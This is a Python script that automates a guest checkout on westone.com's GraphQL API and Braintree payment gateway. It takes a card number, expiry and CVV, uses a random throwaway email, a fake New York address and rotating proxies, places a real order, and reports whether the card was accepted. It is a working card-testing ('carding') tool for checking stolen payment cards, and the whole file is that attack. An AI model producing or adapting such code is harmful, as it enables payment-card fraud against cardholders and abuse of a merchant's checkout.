import random
import string
import asyncio
import base64
import json
from aiohttp import ClientSession
from functions.functions import ProxyRandom


def random_email():
    random_letters = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{random_letters}@gmail.com"


def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )


proxy = ProxyRandom


async def b3(cc, mes, ano, cvv, proxy: str = None) -> str | None:

    if len(ano) == 2:
        ano = "20" + ano
    if len(mes) == 1:
        mes = "0" + mes

    email = random_email()

    async with ClientSession() as s:
        headers = {
            "Accept-Language": "es-419,es;q=0.8",
            "Connection": "keep-alive",
            "Origin": "https://westone.com",
            "Referer": "https://westone.com/silicone-singles",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "accept": "*/*",
            "authorization": "null",
            "content-currency": "USD",
            "content-type": "application/json",
            "store": "default",
            "x-platform": "westone_headless",
        }

        json_data = {
            "operationName": "createEmptyCart",
            "variables": {},
            "query": "mutation createEmptyCart($cart_id: String) {\n  createEmptyCart(input: {cart_id: $cart_id})\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )
        response = await response.json()
        cart = response["data"]["createEmptyCart"]

        json_data = {
            "operationName": "addConfigurableToCart",
            "variables": {
                "cart_id": cart,
                "cartItems": [
                    {
                        "parent_sku": "1020xx",
                        "data": {
                            "quantity": 1,
                            "sku": "10200",
                        },
                    },
                ],
            },
            "query": "mutation addConfigurableToCart($cart_id: String!, $cartItems: [ConfigurableProductCartItemInput]!) {\n  addToCart: addConfigurableProductsToCart(\n    input: {cart_id: $cart_id, cart_items: $cartItems}\n  ) {\n    cart {\n      id\n      email\n      is_virtual\n      ...cartItems\n      prices {\n        ...cart_prices\n      }\n      total_quantity\n      applied_coupons {\n        code\n      }\n      shipping_addresses {\n        ...shippingAddress\n      }\n      available_payment_methods {\n        code\n        title\n      }\n    }\n  }\n}\n\nfragment cartItems on Cart {\n  items {\n    id\n    product {\n      id\n      name\n      sku\n      type_id\n      url_key\n      thumbnail {\n        label\n        url\n      }\n      price_range {\n        ...price_range\n        __typename\n      }\n      ...configurableProduct\n    }\n    quantity\n    prices {\n      discounts {\n        amount {\n          value\n        }\n      }\n      row_total {\n        currency\n        value\n      }\n      price {\n        value\n      }\n    }\n    ...configurableCart\n    ...downloadableCart\n    ...bundleCartItem\n    __typename\n  }\n}\n\nfragment price_range on PriceRange {\n  minimum_price {\n    discount {\n      amount_off\n    }\n    final_price {\n      value\n    }\n    regular_price {\n      value\n    }\n  }\n  maximum_price {\n    discount {\n      amount_off\n    }\n    final_price {\n      value\n    }\n    regular_price {\n      value\n    }\n  }\n}\n\nfragment configurableCart on ConfigurableCartItem {\n  configurable_options {\n    id: configurable_product_option_uid\n    option_label\n    value_id\n    value_label\n  }\n}\n\nfragment downloadableCart on DownloadableCartItem {\n  links {\n    id\n    price\n    sample_url\n    title\n  }\n}\n\nfragment bundleCartItem on BundleCartItem {\n  bundle_options {\n    label\n    type\n    id\n    values {\n      id\n      label\n      price\n      quantity\n    }\n  }\n  __typename\n}\n\nfragment configurableProduct on ConfigurableProduct {\n  configurable_options {\n    attribute_code\n    id: uid\n    label\n    position\n    attribute_swatch_type\n    values {\n      label\n      swatch_data {\n        value\n      }\n      use_default_value\n      value_index\n    }\n  }\n  variants {\n    ...customerVariant\n    __typename\n  }\n}\n\nfragment customerVariant on ConfigurableVariant {\n  attributes {\n    code\n    value_index\n  }\n  product {\n    sku\n    price_range {\n      ...price_range\n      __typename\n    }\n    small_image {\n      label\n      url\n    }\n    thumbnail {\n      label\n      url\n    }\n    stock_status\n    media_gallery {\n      disabled\n      label\n      position\n      thumbnail: url\n      ... on ProductVideo {\n        video_content {\n          media_type\n          video_provider\n          video_url\n          video_title\n          video_description\n          video_metadata\n        }\n      }\n      __typename\n    }\n  }\n}\n\nfragment cart_prices on CartPrices {\n  applied_taxes {\n    label\n    amount {\n      value\n    }\n  }\n  discounts {\n    label\n    amount {\n      value\n    }\n  }\n  grand_total {\n    value\n  }\n  subtotal_excluding_tax {\n    value\n  }\n  subtotal_including_tax {\n    value\n  }\n  subtotal_with_discount_excluding_tax {\n    value\n  }\n}\n\nfragment shippingAddress on ShippingCartAddress {\n  firstname\n  lastname\n  city\n  company\n  country {\n    code\n    label\n  }\n  region {\n    code\n    label\n    region_id\n  }\n  postcode\n  street\n  telephone\n  available_shipping_methods {\n    amount {\n      value\n    }\n    available\n    carrier_code\n    carrier_title\n    method_code\n    method_title\n  }\n  selected_shipping_method {\n    amount {\n      currency\n      value\n    }\n    carrier_code\n    carrier_title\n    method_code\n    method_title\n  }\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )

        json_data = {
            "operationName": "setShippingAddresses",
            "variables": {
                "cart_id": cart,
                "addresses": [
                    {
                        "address": {
                            "firstname": "Alex",
                            "lastname": "Varela",
                            "postcode": "10080",
                            "street": [
                                "New York Street 10",
                                "",
                            ],
                            "city": "New York",
                            "telephone": "9513573888",
                            "country_code": "US",
                            "region": "",
                            "region_id": 127,
                            "save_in_address_book": False,
                        },
                    },
                ],
            },
            "query": "mutation setShippingAddresses($cart_id: String!, $addresses: [ShippingAddressInput]!) {\n  setShippingAddressesOnCart(\n    input: {cart_id: $cart_id, shipping_addresses: $addresses}\n  ) {\n    cart {\n      id\n      email\n      is_virtual\n      ...cartItems\n      prices {\n        ...cart_prices\n      }\n      total_quantity\n      applied_coupons {\n        code\n      }\n      shipping_addresses {\n        ...shippingAddress\n      }\n      available_payment_methods {\n        code\n        title\n      }\n    }\n  }\n}\n\nfragment cartItems on Cart {\n  items {\n    id\n    product {\n      id\n      name\n      sku\n      type_id\n      url_key\n      thumbnail {\n        label\n        url\n      }\n      price_range {\n        ...price_range\n        __typename\n      }\n      ...configurableProduct\n    }\n    quantity\n    prices {\n      discounts {\n        amount {\n          value\n        }\n      }\n      row_total {\n        currency\n        value\n      }\n      price {\n        value\n      }\n    }\n    ...configurableCart\n    ...downloadableCart\n    ...bundleCartItem\n    __typename\n  }\n}\n\nfragment price_range on PriceRange {\n  minimum_price {\n    discount {\n      amount_off\n    }\n    final_price {\n      value\n    }\n    regular_price {\n      value\n    }\n  }\n  maximum_price {\n    discount {\n      amount_off\n    }\n    final_price {\n      value\n    }\n    regular_price {\n      value\n    }\n  }\n}\n\nfragment configurableCart on ConfigurableCartItem {\n  configurable_options {\n    id: configurable_product_option_uid\n    option_label\n    value_id\n    value_label\n  }\n}\n\nfragment downloadableCart on DownloadableCartItem {\n  links {\n    id\n    price\n    sample_url\n    title\n  }\n}\n\nfragment bundleCartItem on BundleCartItem {\n  bundle_options {\n    label\n    type\n    id\n    values {\n      id\n      label\n      price\n      quantity\n    }\n  }\n  __typename\n}\n\nfragment configurableProduct on ConfigurableProduct {\n  configurable_options {\n    attribute_code\n    id: uid\n    label\n    position\n    attribute_swatch_type\n    values {\n      label\n      swatch_data {\n        value\n      }\n      use_default_value\n      value_index\n    }\n  }\n  variants {\n    ...customerVariant\n    __typename\n  }\n}\n\nfragment customerVariant on ConfigurableVariant {\n  attributes {\n    code\n    value_index\n  }\n  product {\n    sku\n    price_range {\n      ...price_range\n      __typename\n    }\n    small_image {\n      label\n      url\n    }\n    thumbnail {\n      label\n      url\n    }\n    stock_status\n    media_gallery {\n      disabled\n      label\n      position\n      thumbnail: url\n      ... on ProductVideo {\n        video_content {\n          media_type\n          video_provider\n          video_url\n          video_title\n          video_description\n          video_metadata\n        }\n      }\n      __typename\n    }\n  }\n}\n\nfragment cart_prices on CartPrices {\n  applied_taxes {\n    label\n    amount {\n      value\n    }\n  }\n  discounts {\n    label\n    amount {\n      value\n    }\n  }\n  grand_total {\n    value\n  }\n  subtotal_excluding_tax {\n    value\n  }\n  subtotal_including_tax {\n    value\n  }\n  subtotal_with_discount_excluding_tax {\n    value\n  }\n}\n\nfragment shippingAddress on ShippingCartAddress {\n  firstname\n  lastname\n  city\n  company\n  country {\n    code\n    label\n  }\n  region {\n    code\n    label\n    region_id\n  }\n  postcode\n  street\n  telephone\n  available_shipping_methods {\n    amount {\n      value\n    }\n    available\n    carrier_code\n    carrier_title\n    method_code\n    method_title\n  }\n  selected_shipping_method {\n    amount {\n      currency\n      value\n    }\n    carrier_code\n    carrier_title\n    method_code\n    method_title\n  }\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )

        json_data = {
            "operationName": "setShippingMethods",
            "variables": {
                "cart_id": cart,
                "method": [
                    {
                        "carrier_code": "matrixrate",
                        "method_code": "matrixrate_5494",
                    },
                ],
            },
            "query": "mutation setShippingMethods($cart_id: String!, $method: [ShippingMethodInput]!) {\n  setShippingMethodsOnCart(input: {cart_id: $cart_id, shipping_methods: $method}) {\n    cart {\n      id\n      email\n      is_virtual\n      ...cartItems\n      prices {\n        ...cart_prices\n      }\n      total_quantity\n      applied_coupons {\n        code\n      }\n      available_payment_methods {\n        code\n        title\n      }\n      shipping_addresses {\n        ...shippingAddress\n      }\n      available_payment_methods {\n        code\n        title\n      }\n    }\n  }\n}\n\nfragment cartItems on Cart {\n  items {\n    id\n    product {\n      id\n      name\n      sku\n      type_id\n      url_key\n      thumbnail {\n        label\n        url\n      }\n      price_range {\n        ...price_range\n        __typename\n      }\n      ...configurableProduct\n    }\n    quantity\n    prices {\n      discounts {\n        amount {\n          value\n        }\n      }\n      row_total {\n        currency\n        value\n      }\n      price {\n        value\n      }\n    }\n    ...configurableCart\n    ...downloadableCart\n    ...bundleCartItem\n    __typename\n  }\n}\n\nfragment price_range on PriceRange {\n  minimum_price {\n    discount {\n      amount_off\n    }\n    final_price {\n      value\n    }\n    regular_price {\n      value\n    }\n  }\n  maximum_price {\n    discount {\n      amount_off\n    }\n    final_price {\n      value\n    }\n    regular_price {\n      value\n    }\n  }\n}\n\nfragment configurableCart on ConfigurableCartItem {\n  configurable_options {\n    id: configurable_product_option_uid\n    option_label\n    value_id\n    value_label\n  }\n}\n\nfragment downloadableCart on DownloadableCartItem {\n  links {\n    id\n    price\n    sample_url\n    title\n  }\n}\n\nfragment bundleCartItem on BundleCartItem {\n  bundle_options {\n    label\n    type\n    id\n    values {\n      id\n      label\n      price\n      quantity\n    }\n  }\n  __typename\n}\n\nfragment configurableProduct on ConfigurableProduct {\n  configurable_options {\n    attribute_code\n    id: uid\n    label\n    position\n    attribute_swatch_type\n    values {\n      label\n      swatch_data {\n        value\n      }\n      use_default_value\n      value_index\n    }\n  }\n  variants {\n    ...customerVariant\n    __typename\n  }\n}\n\nfragment customerVariant on ConfigurableVariant {\n  attributes {\n    code\n    value_index\n  }\n  product {\n    sku\n    price_range {\n      ...price_range\n      __typename\n    }\n    small_image {\n      label\n      url\n    }\n    thumbnail {\n      label\n      url\n    }\n    stock_status\n    media_gallery {\n      disabled\n      label\n      position\n      thumbnail: url\n      ... on ProductVideo {\n        video_content {\n          media_type\n          video_provider\n          video_url\n          video_title\n          video_description\n          video_metadata\n        }\n      }\n      __typename\n    }\n  }\n}\n\nfragment cart_prices on CartPrices {\n  applied_taxes {\n    label\n    amount {\n      value\n    }\n  }\n  discounts {\n    label\n    amount {\n      value\n    }\n  }\n  grand_total {\n    value\n  }\n  subtotal_excluding_tax {\n    value\n  }\n  subtotal_including_tax {\n    value\n  }\n  subtotal_with_discount_excluding_tax {\n    value\n  }\n}\n\nfragment shippingAddress on ShippingCartAddress {\n  firstname\n  lastname\n  city\n  company\n  country {\n    code\n    label\n  }\n  region {\n    code\n    label\n    region_id\n  }\n  postcode\n  street\n  telephone\n  available_shipping_methods {\n    amount {\n      value\n    }\n    available\n    carrier_code\n    carrier_title\n    method_code\n    method_title\n  }\n  selected_shipping_method {\n    amount {\n      currency\n      value\n    }\n    carrier_code\n    carrier_title\n    method_code\n    method_title\n  }\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )

        json_data = {
            "operationName": "setGuestEmail",
            "variables": {
                "cart_id": cart,
                "email": email,
            },
            "query": "mutation setGuestEmail($cart_id: String!, $email: String!) {\n  setGuestEmailOnCart(input: {cart_id: $cart_id, email: $email}) {\n    cart {\n      email\n    }\n  }\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )

        json_data = {
            "operationName": "createBraintreeClientToken",
            "variables": {},
            "query": "mutation createBraintreeClientToken {\n  token: createBraintreeClientToken\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )
        response = await response.json()
        braintree_client_token = json.loads(
            base64.b64decode(response["data"]["token"]).decode()
        )["authorizationFingerprint"]

        headers = {
            "Accept": "*/*",
            "Accept-Language": "es-419,es;q=0.8",
            "Authorization": "Bearer " + braintree_client_token,
            "Braintree-Version": "2018-05-10",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        }

        json_data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "9c1d133e-3d8f-4f4f-a6ed-b37ae9f47541",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mes,
                        "expirationYear": ano,
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "10080",
                        },
                    },
                    "options": {
                        "validate": False,
                    },
                },
            },
            "operationName": "TokenizeCreditCard",
        }

        response = await s.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )
        response = await response.json()
        token_cc = response["data"]["tokenizeCreditCard"]["token"]

        headers = {
            "Accept-Language": "es-419,es;q=0.8",
            "Connection": "keep-alive",
            "Origin": "https://westone.com",
            "Referer": "https://westone.com/checkout",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "accept": "*/*",
            "authorization": "null",
            "content-currency": "USD",
            "content-type": "application/json",
            "store": "default",
            "x-platform": "westone_headless",
        }

        json_data = {
            "operationName": "setBillingAddresses",
            "variables": {
                "cart_id": cart,
                "addresses": {
                    "address": {
                        "firstname": "Alex",
                        "lastname": "Varela",
                        "city": "New York",
                        "company": None,
                        "postcode": "10080",
                        "street": [
                            "New York Street 10",
                        ],
                        "telephone": "9513573888",
                        "country_code": "US",
                        "region": "",
                        "region_id": 127,
                    },
                },
            },
            "query": "mutation setBillingAddresses($cart_id: String!, $addresses: BillingAddressInput!) {\n  setBillingAddressOnCart(input: {cart_id: $cart_id, billing_address: $addresses}) {\n    cart {\n      billing_address {\n        city\n        company\n        country {\n          code\n          label\n        }\n        firstname\n        lastname\n        postcode\n        region {\n          code\n          label\n          region_id\n        }\n        street\n        telephone\n      }\n    }\n  }\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )

        json_data = {
            "operationName": "setPaymentMethods",
            "variables": {
                "cart_id": cart,
                "method": {
                    "code": "braintree",
                    "braintree": {
                        "payment_method_nonce": token_cc,
                        "device_data": '{"correlation_id":"75ce278e56c593699ef4e885ed4e8ae6"}',
                        "is_active_payment_token_enabler": False,
                    },
                },
            },
            "query": "mutation setPaymentMethods($cart_id: String!, $method: PaymentMethodInput!) {\n  setPaymentMethodOnCart(input: {cart_id: $cart_id, payment_method: $method}) {\n    cart {\n      selected_payment_method {\n        code\n        title\n      }\n    }\n  }\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )

        json_data = {
            "operationName": "placeOrder",
            "variables": {
                "cart_id": cart,
            },
            "query": "mutation placeOrder($cart_id: String!) {\n  placeOrder(input: {cart_id: $cart_id}) {\n    order {\n      order_id\n      order_entity_id\n    }\n  }\n}",
        }

        response = await s.post(
            "https://westone.com/api/graphql",
            headers=headers,
            json=json_data,
            proxy=proxy,
            ssl=False,
        )
        response_text = await response.text()
        if "order_id" in response_text:
            return True
        response = await response.json()
        msg = response["errors"][0]["message"]
        return msg
